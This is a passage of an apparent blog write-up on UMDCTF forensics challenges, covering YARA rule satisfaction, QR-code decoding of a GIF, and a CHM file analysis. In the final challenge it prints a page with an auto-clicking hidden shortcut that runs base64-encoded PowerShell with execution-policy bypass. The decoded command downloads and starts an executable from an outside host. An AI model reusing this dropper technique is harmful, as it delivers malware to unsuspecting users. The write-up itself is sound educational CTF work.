+<p>fourth rule</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex1</span> <span class="o">=</span> <span class="p">{</span><span class="mi">73</span> <span class="mi">6</span><span class="nx">f</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span> <span class="mi">67</span> <span class="mi">73</span> <span class="mi">6</span><span class="nx">f</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span> <span class="mi">67</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">61</span> <span class="mi">6</span><span class="nx">c</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">72</span> <span class="mi">65</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex2</span> <span class="o">=</span> <span class="p">{</span><span class="mi">5445414</span><span class="nx">d524f434b4554</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex3</span> <span class="o">=</span> <span class="p">{</span><span class="mi">696</span><span class="nx">d20736f207469726564</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex4</span> <span class="o">=</span> <span class="p">{</span><span class="mi">736</span><span class="nx">c656570792074696d65</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$hex1</span> <span class="k">and</span> <span class="nv">$hex2</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$hex3</span> <span class="k">and</span> <span class="nv">$hex4</span><span class="p">)</span>
+</span></span></code></pre></div><p>We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.</p>
+<blockquote>
+<p>sixth rule</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$xor</span> <span class="o">=</span> <span class="s2">&#34;aqvkpjmdofazwf{lqjm1310&lt;&#34;</span> <span class="k">xor</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$xor</span>
+</span></span></code></pre></div><p>Add the string <code>aqvkpjmdofazwf{lqjm1310&lt;</code> to complete the process: <code>61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c</code>.</p>
+<blockquote>
+<p>seventh rule</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">any</span> <span class="nx">section</span> <span class="nx">in</span> <span class="nx">elf</span><span class="o">.</span><span class="nx">sections</span> <span class="o">:</span> <span class="p">(</span><span class="nx">section</span><span class="o">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">&#34;poophaha&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>We need a section named <code>poophaha</code> (Please note that with the 40 sections created earlier, one of them should be named <code>poophaha</code>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># objcopy --add-section .poophaha=data.txt main
+</span></span></span></code></pre></div><h3 id="second-file">
+<a class="header-anchor" href="#second-file"></a>
+Second file
+</h3><p><img src="/images/writeups-forensics-umdctf/image-16.png" alt=""></p>
+<p>For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule5</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">math</span><span class="o">.</span><span class="nx">entropy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">filesize</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">filesize</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="nx">MB</span> <span class="k">and</span> <span class="nx">filesize</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="nx">MB</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.</p>
+<p>After creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.</p>
+<p>To achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># openssl rand -out random.bin 2000000
+</span></span></span></code></pre></div><p><code>2000000</code> here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)</p>
+<p>Next, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.</p>
+<p><a href="/images/writeups-forensics-umdctf/File/hex.txt">hex of file</a> và <a href="/images/writeups-forensics-umdctf/File/download.elf">file after creation</a></p>
+<p><strong>UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}</strong></p>
+<ul>
+<li>Also, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes.</li>
+</ul>
+<p><img src="/images/writeups-forensics-umdctf/image-17.png" alt=""></p>
+<h2 id="telekinetic-warfare">
+<a class="header-anchor" href="#telekinetic-warfare"></a>
+Telekinetic Warfare
+</h2><p><img src="/images/writeups-forensics-umdctf/image-18.png" alt=""></p>
+<p>In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">glob</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Replace &#39;path/to/folder&#39; with the actual path to the folder containing the QR codes</span>
+</span></span><span class="line"><span class="cl"><span class="n">folder_path</span> <span class="o">=</span> <span class="s1">&#39;qrcodes/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">output_file</span> <span class="o">=</span> <span class="s1">&#39;qr_codes.txt&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create a list of all the image files in the folder</span>
+</span></span><span class="line"><span class="cl"><span class="n">image_files</span> <span class="o">=</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="s1">&#39;*.jpg&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Open the output file for writing</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Loop over each image file in the folder</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">image_file</span> <span class="ow">in</span> <span class="n">image_files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Open the image and decode the QR code</span>
+</span></span><span class="line"><span class="cl">        <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">qr_code</span> <span class="o">=</span> <span class="n">decode</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># If a QR code was detected, write the URL to the output file</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">qr_code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="n">qr_code</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the <a href="/images/writeups-forensics-umdctf/File/decode.pdf">decode flag</a>.</p>
+<p><strong>UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}</strong></p>
+<h2 id="doctors-hate-him">
+<a class="header-anchor" href="#doctors-hate-him"></a>
+Doctors hate him!!
+</h2><p><img src="/images/writeups-forensics-umdctf/image-19.png" alt=""></p>
+<p>Based on the <code>Malware Chall Disclaimer</code> challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). <strong>little timmy</strong> and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.</p>
+<p>In this challenge, I received a <code>chm</code> file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn&rsquo;t find much&hellip; (except for a button that didn&rsquo;t do anything).</p>
+<p><img src="/images/writeups-forensics-umdctf/image-20.png" alt=""></p>
+<p>Based on this button, I think it might have originally been a web page&hellip;</p>
+<p>I used the <a href="http://www.create-chm.com/chm-help-compiler/">HelpSmith</a> tool and obtained the following zip file.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-21.png" alt=""></p>
+<p>Yes, it does contain a real web page&hellip; now it&rsquo;s more accurate.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-23.png" alt=""></p>
+<p>In the source code of the web page, there is a base64-encoded string: <code>VU1EQ1RGezE5OTdfY2FsbGVkXw==</code>.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-22.png" alt=""></p>
+<p>&ndash;&gt; <code>UMDCTF{1997_called_</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">PARAM</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;Item1&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA&#39;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span><span class="nx">VU1EQ1RGezE5OTdfY2FsbGVkXw</span><span class="o">==--&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">OBJECT</span> <span class="nx">id</span><span class="o">=</span><span class="nx">shortcut</span> <span class="nx">classid</span><span class="o">=</span><span class="s2">&#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">width</span><span class="o">=</span><span class="mi">1</span> <span class="nx">height</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">PARAM</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;Command&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;ShortCut&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">PARAM</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;Button&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;Bitmap::shortcut&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">PARAM</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;Item1&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA&#39;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">PARAM</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;Item2&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;273,1,1&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">OBJECT</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span> <span class="nx">shortcut</span><span class="o">.</span><span class="nx">Click</span><span class="p">();</span> <span class="o">&lt;/</span><span class="nx">SCRIPT</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;container&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;text&#34;</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">DOCTORS</span> <span class="nx">HATE</span> <span class="nx">HIM</span><span class="o">!!&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">Do</span> <span class="nx">you</span> <span class="nx">suffer</span> <span class="nx">from</span> <span class="nx">low</span> <span class="nx">energy</span><span class="p">,</span> <span class="nx">fatigue</span><span class="p">,</span> <span class="k">and</span> <span class="nx">a</span> <span class="nx">general</span> <span class="nx">lack</span> <span class="nx">of</span> <span class="nx">motivation</span><span class="o">?</span> <span class="nx">Did</span> <span class="nx">your</span> <span class="nx">Pokemon</span> <span class="nx">leave</span> <span class="nx">you</span> <span class="k">for</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">a</span> <span class="nx">better</span> <span class="nx">trainer</span><span class="o">?</span> <span class="nx">Rocket</span> <span class="nx">Corp</span><span class="err">&#39;</span><span class="nx">s</span> <span class="nx">Master</span> <span class="nx">Ball</span> <span class="nx">Serum</span> <span class="nx">can</span> <span class="nx">help</span><span class="o">!</span> <span class="nx">Our</span> <span class="nx">all</span><span class="o">-</span><span class="nx">natural</span> <span class="nx">formula</span> <span class="nx">boosts</span> <span class="nx">your</span> <span class="nx">energy</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">levels</span> <span class="k">and</span> <span class="nx">helps</span> <span class="nx">you</span> <span class="nx">feel</span> <span class="nx">like</span> <span class="nx">a</span> <span class="nx">young</span> <span class="nx">trainer</span> <span class="nx">ready</span> <span class="nx">to</span> <span class="nx">take</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">world</span> <span class="nx">again</span><span class="o">!&lt;/</span><span class="nx">p</span><span class="o">&gt;&lt;</span><span class="nx">button</span><span class="o">&gt;</span><span class="nx">Find</span> <span class="nx">out</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">more</span><span class="o">!&lt;/</span><span class="nx">button</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;image&#34;</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;depressed_pokemon_trainer.png&#34;</span> <span class="nx">alt</span><span class="o">=</span><span class="s2">&#34;Pikachu&#34;</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$env</span><span class="o">:</span><span class="nx">WEB_REQUEST</span> <span class="o">-</span><span class="nx">Uri</span> <span class="nx">http</span><span class="o">://</span><span class="nx">dns</span><span class="o">-</span><span class="nx">server</span><span class="o">:</span><span class="mi">6969</span><span class="o">/</span><span class="nx">explorer</span><span class="o">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">OutFile</span> <span class="nx">explorer</span><span class="o">.</span><span class="nx">exe</span><span class="p">;</span> <span class="nx">Start</span><span class="o">-</span><span class="nx">Process</span> <span class="nx">explorer</span><span class="o">.</span><span class="nx">exe</span>
+</span></span></code></pre></div><p>and</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA==
+</span></span></code></pre></div><p>Decoding the above base64 string yields <code>Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;</code></p>
+<p>Afterwards, I found another segment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA
+</span></span></code></pre></div><p>Decode base64:
+<code>Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'</code></p>
+<p><code>gurl_jnag_gurve</code> looks quite similar to a flag :)), I used ChatGPT and found out it&rsquo;s ROT13 encoded :))), guessing until death!!!</p>
+<p><img src="/images/writeups-forensics-umdctf/image-24.png" alt=""></p>
+<p>&ndash;&gt; <code>they_want_their</code></p>
+<p>Here comes the <strong>one wrong step, one mile astray</strong> moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing <code>explore.exe</code> in connection with the challenge name <code>Malware Chall Disclaimer</code>. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that <code>explore.exe</code> while also attempting to decipher it before reaching the solution.</p>
+<p><img src="/images/writeups-forensics-umdctf/image.png" alt=""></p>
+<p>I should have checked the website itself to see if there was anything significant.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-25.png" alt=""></p>
+<p>Thank goodness! If I hadn&rsquo;t discovered this by accident before the competition was over, I might have given up on forensics altogether.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-26.png" alt=""></p>
+<p><strong>UMDCTF{1997_called_they_want_their_malware_back_bozo}</strong></p>
+<h2 id="conclusion">
+<a class="header-anchor" href="#conclusion"></a>
+Conclusion
+</h2><p>In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.</p>
+<p>Thanks to <code>Hwi#9932</code> for helping me identify some misconceptions in the <code>Telekinetic Warfare</code> challenge and to everyone in <code>BKSEC</code> for constantly encouraging me to improve my skills in forensic challenges digital.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        
+
+
+
+
+
+
+<blockquote class="article-copyright">
+  
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Spid3r @ Adventures of Spid3r</p>
+  
+  
+  
+  
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2023-05-17 11:00:00</p>
+  
+  
+  
+    <p>
+      <strong><span class="icon-copyright icon"></span>License: </strong>
+      All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener external nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!
+    </p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  
+</blockquote>
+
+      
+
+      
+        <div class="sponsor-wrapper">
+  <div class="sponsor-button-wrapper">
+    <div class="sponsor-icon rotate"></div>
+    <div class="sponsor-title">Sponsor</div>
+    <div class="sponsor-icon rotate"></div>
+  </div>
+  <div class="sponsor-tip">Buy the author a coffee!</div>
+  
+    <div class="sponsor-qr">
+      
+        <div class="sponsor-qr-image-wrapper">
+          <img src="/images/bmc_qr.png" alt="buymeacoffee.com/spid3r" width="200" />
+          <p class="sponsor-qr-name">buymeacoffee.com/spid3r</p>
+        </div>
+      
+    </div>
+  
+</div>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <ul class="article-tag-list" itemprop="keywords">
+  
+</ul>
+
+    </footer>
+  </div>
+  
+    
+  <nav
+    id="article-nav"
+    data-aos="fade-up"
+  >
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img
+            data-src="https://hackmd.io/_uploads/Hk9g7yPWyg.png"
+            data-sizes="auto"
+            alt="Kali Linux VPS for Free: A Segfault Tutorial That Makes It Possible"
+            class="lazyload"
+          />
+        
+        <a href="https://sondt1337.github.io/post/kali-linux-vps-for-free/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            Kali Linux VPS for Free: A Segfault Tutorial That Makes It Possible
+          
+        </h3>
+      </div>
+    
+
+    
+      <div class="article-nav-link-wrap article-nav-link-right">
+        
+          <img
+            data-src="/images/cookie_arena_2/featured.png"
+            data-sizes="auto"
+            alt="Cookie Arena 2 | Reverse Engineering"
+            class="lazyload"
+          />
+        
+        <a href="https://sondt1337.github.io/post/cookie-arena-2/"></a>
+        <div class="article-nav-caption">Older</div>
+        <h3 class="article-nav-title">
+          
+            Cookie Arena 2 | Reverse Engineering
+          
+        </h3>
+      </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+
+<footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+      <div style="flex-direction:column;align-items: center;"><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"></a>
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2021 -
+      2025
+      <span class="footer-info-sep rotate"></span>
+      Spid3r
+    </div>
+    
+      <div>
+        <span class="icon-brush"
+          >&nbsp;
+            13.4k
+          </span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;
+          
+          
+
+          01:09
+        </span>
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar">
+          <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#information">Information</a></li>
+    <li><a href="#ranking">Ranking</a></li>
+    <li><a href="#malware-chall-disclaimer">Malware Chall Disclaimer</a></li>
+    <li><a href="#mirror-unknown">Mirror Unknown</a></li>
+    <li><a href="#no-352">No. 352</a></li>
+    <li><a href="#fire-type-pokemon-only">Fire Type Pokemon Only</a></li>
+    <li><a href="#yara-trainer-gym">YARA Trainer Gym</a>
+      <ul>
+        <li><a href="#first-file">First file</a></li>
+        <li><a href="#second-file">Second file</a></li>
+      </ul>
+    </li>
+    <li><a href="#telekinetic-warfare">Telekinetic Warfare</a></li>
+    <li><a href="#doctors-hate-him">Doctors hate him!!</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+        </div>
+        <div class="sidebar-common-sidebar hidden">
+          
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.jpg"
+    data-sizes="auto"
+    alt="Spid3r"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Spid3r</div>
+  <div class="sidebar-description">I&#39;m a little spider</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      0
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
